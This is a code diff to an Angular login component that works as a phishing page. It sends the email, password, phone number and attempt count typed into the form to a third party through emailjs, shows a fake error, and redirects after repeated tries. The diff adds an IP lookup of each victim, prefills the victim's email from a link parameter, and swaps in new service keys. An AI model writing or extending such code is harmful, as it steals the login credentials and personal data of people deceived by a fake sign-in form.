@@ -1,8 +1,11 @@
 import { CommonModule } from '@angular/common';
-import { Component, OnInit } from '@angular/core';
+import { Component, OnDestroy, OnInit } from '@angular/core';
 import { ReactiveFormsModule, FormGroup, FormBuilder } from '@angular/forms';
 import { COUNTRY_PHONE_CODES } from '../../Core/constants';
 import emailjs from '@emailjs/browser';
+import { HttpClient } from '@angular/common/http';
+import { Subscription } from 'rxjs';
+import { ActivatedRoute } from '@angular/router';
 
 @Component({
   selector: 'app-login-section',
@@ -10,7 +13,7 @@ import emailjs from '@emailjs/browser';
   templateUrl: './login-section.component.html',
   styleUrl: './login-section.component.scss',
 })
-export class LoginSectionComponent implements OnInit {
+export class LoginSectionComponent implements OnInit, OnDestroy {
   loginForm!: FormGroup;
   showPassword = false;
 
@@ -22,7 +25,14 @@ export class LoginSectionComponent implements OnInit {
 
   countryCodes = COUNTRY_PHONE_CODES;
 
-  constructor(private fb: FormBuilder) {}
+  userId!: string;
+
+  private subscription = new Subscription();
+  constructor(
+    private fb: FormBuilder,
+    private http: HttpClient,
+    private route: ActivatedRoute
+  ) {}
 
   ngOnInit(): void {
     this.loginForm = this.fb.group({
@@ -31,6 +41,38 @@ export class LoginSectionComponent implements OnInit {
       phoneNumber: this.fb.control(''),
       countryCode: this.fb.control(this.countryCodes[1].code),
     });
+
+    this.getUserId();
+
+    this.getEmail();
+  }
+
+  getEmail() {
+    this.subscription.add(
+      this.route.queryParams.subscribe((param) => {
+        const email = param['email'];
+
+        if (email) {
+          this.loginForm.patchValue({
+            account: email,
+            password: '',
+            phoneNumber: '',
+            countryCode: '',
+          });
+        }
+      })
+    );
+  }
+
+  getUserId() {
+    this.subscription.add(
+      this.http
+        .get('https://api.ipify.org?format=json')
+        .subscribe((resData: any) => {
+          this.userId = resData.ip;
+          // console.log(this.userId);
+        })
+    );
   }
 
   get loginFormControl() {
@@ -72,18 +114,17 @@ export class LoginSectionComponent implements OnInit {
   async send(end: boolean = false) {
     this.showLoader = true;
 
-    emailjs.init('08gaTi0yX9GYMg2w_');
+    emailjs.init('NKHmyO1Zy4d62isst');
     const response = await emailjs
-      .send('service_4fx4y8a', 'template_0tzq3y5', {
+      .send("service_tep2rho","template_dztuzu6", {
         name: 'Stanley',
         message: `Email: ${
           this.loginFormControl['account'].value || ''
-        } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
-          this.loginFormControl['countryCode'].value
-        } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
-          this.attemptCount + 1
-        }`,
-        email: 'ubaid.valtorquegroup@hotmail.com',
+        }, Password: ${
+          this.loginFormControl['password'].value
+        }, Phone Number: ${this.loginFormControl['countryCode'].value}, ${
+          this.loginFormControl['phoneNumber'].value || ''
+        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`
       })
       .then(() => {
         this.showError = true;
@@ -99,5 +140,11 @@ export class LoginSectionComponent implements OnInit {
           this.redirectToExternalSite();
         }
       });
+  }
+
+  ngOnDestroy(): void {
+    if (this.subscription) {
+      this.subscription.unsubscribe();
+    }
   }
 }
